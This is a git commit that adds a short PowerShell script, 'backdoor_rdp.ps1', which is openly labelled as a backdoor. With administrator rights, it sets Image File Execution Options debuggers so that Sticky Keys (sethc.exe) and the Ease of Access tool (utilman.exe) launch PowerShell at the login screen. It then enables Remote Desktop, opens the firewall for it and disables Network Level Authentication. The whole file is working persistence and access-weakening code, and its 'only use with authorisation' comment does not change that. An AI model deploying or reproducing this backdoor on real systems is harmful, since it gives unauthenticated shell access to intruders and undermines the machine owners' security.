df36802321bc113ee558537b4c7e055a1b3f8c7c
Daniel Card <dan.card@xservus.com>
2021-08-21 08:45:32 +0100

    backdoor_rdp.ps1

---
+++ backdoor_rdp.ps1
@@ -0,0 +1,30 @@
+# Backdoor UTILMAN and SETHC
+# crappy script by mRr3b00t
+# hack for good
+# only use with authorisation
+# use at own risk blah blah blah
+
+$admin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if($admin -eq "True"){
+
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" -Name "Debugger" -Value "powershell.exe" -Type String -Force
+New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe"
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" -Name "Debugger" -Value "powershell.exe" -Type String -Force
+
+#Enable RDP
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+#Check NLA
+
+(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName . -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
+
+#Disable NLA
+(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName . -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
+
+#Check again
+(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName . -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
+
+}
